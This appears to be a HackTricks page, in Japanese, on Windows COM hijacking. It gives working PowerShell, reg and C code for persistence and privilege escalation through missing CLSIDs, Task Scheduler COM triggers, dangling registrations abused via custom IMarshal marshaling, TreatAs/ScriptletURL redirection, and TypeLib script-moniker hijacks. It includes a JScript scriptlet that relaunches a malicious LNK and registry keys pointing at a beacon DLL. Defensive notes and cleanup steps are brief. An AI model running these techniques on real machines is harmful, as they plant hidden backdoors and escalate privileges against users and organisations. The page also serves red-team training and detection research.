# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 存在しない COM コンポーネントの検索

HKCU の値はユーザーが変更できるため、**COM Hijacking** は**永続化メカニズム**として利用できます。`procmon` を使えば、まだ存在せず、攻撃者が作成できる COM レジストリキーを簡単に見つけられます。基本的なフィルター:

- **RegOpenKey** 操作。
- _Result_ が **NAME NOT FOUND**。
- _Path_ が **InprocServer32** で終わる。

調査時に役立つバリエーション:

- 存在しない **`LocalServer32`** キーも探します。一部の COM クラスはアウトプロセスサーバーであり、DLL の代わりに攻撃者が制御する EXE を起動します。
- `InprocServer32` に加えて、**`TreatAs`** および **`ScriptletURL`** のレジストリ操作も検索します。最近の検出コンテンツやマルウェアの分析記事では、通常の COM 登録よりもはるかにまれで、検出の手掛かりとして有用なため、これらが繰り返し取り上げられています。
- HKCU に登録を複製する際は、元の `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` にある正規の **`ThreadingModel`** をコピーします。誤ったモデルを使うと、アクティベーションが失敗し、Hijacking が目立つ原因になります。<sup>[[3]](#references)</sup>
- 64 ビットシステムでは、64 ビットと 32 ビットの両方のビューを確認します（`procmon.exe` と `procmon64.exe`、`HKLM\Software\Classes` と `HKLM\Software\Classes\WOW6432Node`）。32 ビットアプリケーションは、異なる COM 登録を解決することがあります。

偽装する、存在しない COM を決めたら、次のコマンドを実行します。_数秒ごとにロードされる COM を偽装する場合は、過剰な動作になる可能性があるため注意してください。_

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Hijackable Task Scheduler COM components

Windows Tasks は Custom Triggers を使用して COM オブジェクトを呼び出します。Task Scheduler を介して実行されるため、トリガーされるタイミングを予測しやすくなります。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

出力を確認すれば、たとえば**ユーザーがログインするたびに**実行されるものを選べます。

次に、**{1936ED8A-BD93-3213-E325-F38D112938EF}** という CLSID を **HKEY\CLASSES\ROOT\CLSID**、HKLM、HKCU で検索すると、通常、HKCU にその値が存在しないことがわかります。

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

その後、HKCU エントリを作成するだけで、ユーザーがログインするたびに backdoor が実行されます。

## Dangling COM Registrations と Custom Marshaling

マシン全体の COM registration は、レジストリを変更しなくても DLL-planting primitive になり得ます。DLL が存在せず、かつ低権限ユーザーが最終パスを作成または変更できる `InprocServer32` の値を探してください。正確な DLL 名でファイルを配置すると、その CLSID をアクティブ化するすべてのプロセスが攻撃者のコードをロードします。CrossDevice の例では、登録されたパスは `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll` だったため、標準ユーザーが存在しない子ディレクトリと DLL を作成できました。<sup>[[5]](#references)</sup>

### `IMarshal` をクロスプロセス DLL-load primitive として使う

通常、COM は標準の `OBJREF` を使ってインターフェースポインターを表現し、受信側を元のオブジェクトに接続します。`IMarshal` を実装するオブジェクトは、代わりにカスタム `OBJREF` を生成できます。その `GetUnmarshalClass` メソッドは、受信プロセスでオブジェクトを再構築するコードの CLSID を指定します。この CLSID は元のオブジェクトを識別するものである必要はありません。COM はこれをインプロセスサーバーとして解決し、要求されたインターフェースメソッドをディスパッチする前に登録済み DLL をロードします。<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

最小限の悪意ある実装では、`GetUnmarshalClass` 内の dangling CLSID を置き換えるだけで済みます。<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

このオブジェクトを、`[in] IUnknown *` などのプロキシ経由のメソッドパラメータで渡します。別の方法として `CoGetInstanceFromIStorage` を使い、custom-marshaled object にローカルチェックを通過できるだけの `IStorage` も実装させます。リモートサーバーで自動的に unmarshaling が行われると、置き換えられた CLSID が解決され、対象メソッドが実行される前に DLL がロードされます。<sup>[[5]](#references)</sup>

この primitive は、登録が欠落しているケースに限りません。受信側に既存の custom-unmarshaler DLL をロードさせ、そのロード処理や unmarshaling の経路にあるバグを露呈させることもできます。<sup>[[5]](#references)</sup>

この chain が成立するには、以下の条件がすべて必要です。<sup>[[5]](#references)</sup>

1. マシン全体から参照可能な CLSID が、欠落している、または置き換え可能な in-process DLL を指している。
2. 攻撃者が、その DLL を解決されたパスに配置できる。
3. activatable な out-of-process COM server が、目的の特権レベルで実行されている。
4. サーバーが custom marshaling を受け入れ、プロセス境界を越えて攻撃者のオブジェクトを渡すプロキシ経由の呼び出しを公開している。

### 存在しない in-process server を見つける

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) と [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) を使うと、マシンの COM データベースを列挙し、通常の Win32 モジュール解決を通じて各サーバーをテストできます。登録にファイル名しか含まれず、ローダーの検索パスに依存している場合があるため、`Test-Path` よりもこの方法が適しています。<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

結果はexploitabilityの証明ではなく、候補リストとして扱ってください。loaderが解決する方法でパスを解決し、最初に存在する親ディレクトリと、対象DLLがすでに存在する場合はそのDLLのDACLを調べます。ファイルが存在しないことが有用なのは、攻撃者がCOMによって実際に解決されるパスを作成または置換できる場合に限られます。<sup>[[5]](#references)</sup>

### 特権を持つ受信側を選択して起動する

候補となるCOMクラスについて、`RunAs`、サービスとの関連付け、利用可能なインターフェース、RPCプロキシを調べます。`SYSTEM`用に設定されていても、名前付きサービスに関連付けられていないクラスは、RPCSSが起動できないため、直接アクティベーションに失敗することがあります。その場合は、実行可能なスケジュールタスクなど、ホストを起動する非特権のトリガーを探し、サーバーを稼働状態に保つための名前付きイベントやIPCの前提条件を再現してください。<sup>[[5]](#references)</sup>

たとえば、脆弱なShell Create Object Handlerのチェーンは、ユーザーが実行可能なスケジュールタスクを呼び出す前に、想定されるグローバルイベントを作成してホストを起動していました。<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

取得したオブジェクト参照をホストに対応付け、IDとマーシャリングポリシーの両方を検証します。次にインターフェースを列挙し、プロキシをIDLに変換して、偽のオブジェクトをマーシャリングする`IUnknown *`などの入力パラメーターを探します。<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### カスタムマーシャリングの保護

適切な受信側は、信頼できないカスタムマーシャラーを拒否する必要があります。プロセス全体に適用される保護策は、`CoInitializeSecurity` に渡す capabilities に `EOAC_NO_CUSTOM_MARSHAL` を指定することと、`IGlobalOptions::Set` を通じて `COMGLB_UNMARSHALING_POLICY_STRONG` を設定することです。シンボルがある場合、対応する状態は `combase!gCapabilities` と `combase!g_GLBOPT_UnmarshalingPolicy` で確認できます。NtObjectManager は、プロセスパーサーがその Windows ビルドに対応している場合、結果を `CustomMarshalAllowed` として公開します。<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` を使うと、ある CLSID を別の CLSID でエミュレートできます。<sup>[[4]](#references)</sup> 攻撃者の観点では、元の CLSID はそのままにして、`scrobj.dll` を指す2つ目のユーザー単位 CLSID を作成し、`HKCU\Software\Classes\CLSID\{Victim}\TreatAs` で実際の COM オブジェクトを悪意のあるオブジェクトへリダイレクトできます。

次の場合に有用です。

- 対象アプリケーションが、ログオン時またはアプリケーション起動時に、すでに安定した CLSID をインスタンス化している
- 元の `InprocServer32` を置き換えるのではなく、レジストリだけでリダイレクトしたい
- `ScriptletURL` 値を通じて、ローカルまたはリモートの `.sct` scriptlet を実行したい

ワークフローの例（公開されている Atomic Red Team の手法と、過去の COM レジストリ悪用に関する調査を参考にしたもの）：

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notes:

- `scrobj.dll` は `ScriptletURL` の値を読み取り、参照先の `.sct` を実行します。そのため、payload はローカルファイルとして保持することも、HTTP/HTTPS 経由でリモートから取得することもできます。
- `TreatAs` は、元の COM 登録が HKLM に完全かつ安定した状態で存在する場合に特に便利です。ツリー全体を複製せず、小さなユーザー単位のリダイレクトだけで済みます。
- 自然な trigger を待たずに検証するには、対象クラスが STA activation をサポートしている場合、`rundll32.exe -sta <ProgID-or-CLSID>` で偽の ProgID/CLSID を手動でインスタンス化できます。

## COM TypeLib Hijacking (script: moniker persistence)

Type Library (TypeLib) は COM interface を定義し、`LoadTypeLib()` 経由で読み込まれます。COM server がインスタンス化されると、OS は `HKCR\TypeLib\{LIBID}` 配下の registry key を参照して、関連する TypeLib も読み込むことがあります。TypeLib の path が **moniker**（例: `script:C:\...\evil.sct`）に置き換えられていると、TypeLib の解決時に Windows が scriptlet を実行します。これにより、一般的な component が使用されたときに trigger される、検出されにくい persistence が得られます。

これは Microsoft Web Browser control（Internet Explorer、WebBrowser を埋め込んだアプリ、さらには `explorer.exe` からも頻繁に読み込まれます）に対して確認されています。<sup>[[1]](#references)[[2]](#references)</sup>

### 手順 (PowerShell)

1) 高頻度で使用される CLSID が使う TypeLib (LIBID) を特定します。マルウェアの chain でよく悪用される CLSID の例: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser)。

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) `script:` monikerを使って、ユーザーごとのTypeLibパスをローカルのscriptletに向ける（管理者権限は不要）:

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) primary payload（例: initial chain で使用する `.lnk`）を再起動する最小限の JScript `.sct` を配置します:

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) トリガー – IE、WebBrowser コントロールを埋め込んだアプリケーション、または通常の Explorer 操作を行うと、TypeLib が読み込まれて scriptlet が実行され、ログオン／再起動時にチェーンが再び有効になります。

クリーンアップ
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notes
- 同じロジックを他の高頻度 COM コンポーネントにも適用できます。まず `HKCR\CLSID\{CLSID}\TypeLib` から実際の `LIBID` を必ず解決してください。
- 64-bit システムでは、64-bit の利用側向けに `win64` サブキーも設定できます。

## References

- [1] [TypeLib をハイジャックする – 新しい COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: 米国企業を標的とした高度なフィッシング攻撃](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM Hijacking の再考 (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Windows Exploitation Techniques: 孤立した COM オブジェクト登録](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal インターフェイス](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
{{#include ../../banners/hacktricks-training.md}}

